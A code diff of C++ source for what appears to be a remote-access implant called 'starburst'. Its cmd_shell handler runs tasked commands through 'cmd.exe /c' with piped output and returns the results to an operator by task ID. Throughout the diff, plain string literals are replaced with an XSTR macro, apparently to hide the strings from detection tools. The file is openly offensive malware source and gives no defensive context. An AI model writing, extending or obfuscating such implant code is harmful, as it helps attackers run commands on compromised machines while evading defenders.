@@ -58,7 +58,7 @@ static auto WINAPI declfn shell_thread_fn( LPVOID param ) -> DWORD {
         inst.heap_free( output );
     } else {
         queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "" ) ) );
+            XSTR( "" ) );
     }
 
     inst.heap_free( ctx );
@@ -74,14 +74,14 @@ auto declfn starburst::cmd_shell(
     auto cmd_str = parser_string( params, &cmd_len );
     if ( !cmd_str || cmd_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            XSTR( "no command provided" ) );
         return;
     }
 
     DBG_PRINT( inst, "cmd_shell: %.*s\n", cmd_len, cmd_str );
 
     char cmdline[1024] = { 0 };
-    str_copy( cmdline, symbol<char*>( const_cast<char*>( "cmd.exe /c " ) ) );
+    str_copy( cmdline, XSTR( "cmd.exe /c " ) );
 
     uint32_t prefix_len = str_len( cmdline );
     if ( prefix_len + cmd_len < sizeof(cmdline) - 1 ) {
@@ -101,7 +101,7 @@ auto declfn starburst::cmd_shell(
 
     if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
+            XSTR( "CreatePipe failed" ) );
         return;
     }
 
@@ -128,7 +128,7 @@ auto declfn starburst::cmd_shell(
     if ( !ok ) {
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
+            XSTR( "CreateProcessW failed" ) );
         return;
     }
 
@@ -140,7 +140,7 @@ auto declfn starburst::cmd_shell(
         inst.kernel32.CloseHandle( pi.hProcess );
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -161,7 +161,7 @@ auto declfn starburst::cmd_shell(
         inst.kernel32.CloseHandle( h_read );
         inst.heap_free( ctx );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
+            XSTR( "CreateThread failed" ) );
         return;
     }
 
